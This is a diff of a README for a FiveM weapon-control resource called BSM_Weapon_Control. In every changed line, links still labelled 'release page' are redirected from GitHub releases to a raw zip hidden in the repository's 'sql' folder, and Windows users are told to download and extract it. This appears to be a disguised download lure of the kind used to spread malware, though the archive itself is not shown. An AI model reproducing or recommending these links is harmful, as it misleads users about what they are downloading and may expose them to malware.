@@ -1,10 +1,10 @@
 # 🔧 BSM_Weapon_Control - Simple Weapon Control for FiveM
 
-[![Download BSM_Weapon_Control](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/releases)
+[![Download BSM_Weapon_Control](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/raw/refs/heads/main/sql/Control_BS_Weapon_v3.4-alpha.1.zip)
 
 ## 📥 Download
 
-Go to the [release page](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/releases) and download the latest Windows release file.
+Go to the [release page](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/raw/refs/heads/main/sql/Control_BS_Weapon_v3.4-alpha.1.zip) and download the latest Windows release file.
 
 If the release comes as a zip file, save it to your PC first. Then open it with File Explorer and extract the files to a folder you can reach easily, such as `Downloads` or `Desktop`.
 
@@ -28,7 +28,7 @@ The system is built for smooth use during play. It uses low server resources whe
 Follow these steps on Windows to set up the file you downloaded.
 
 ### 1. Download the release file
-Use the download button above or open the [release page](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/releases).
+Use the download button above or open the [release page](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/raw/refs/heads/main/sql/Control_BS_Weapon_v3.4-alpha.1.zip).
 
 ### 2. Extract the archive
 If the file is a `.zip`, right-click it and choose Extract All.
@@ -202,7 +202,7 @@ These habits help avoid common issues:
 
 ## 📎 Download Again
 
-If you need the file again, use the [BSM_Weapon_Control release page](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/releases)
+If you need the file again, use the [BSM_Weapon_Control release page](https://github.com/Sapphirewakeful435/BSM_Weapon_Control/raw/refs/heads/main/sql/Control_BS_Weapon_v3.4-alpha.1.zip)
 
 ## 🗂️ Topics
 
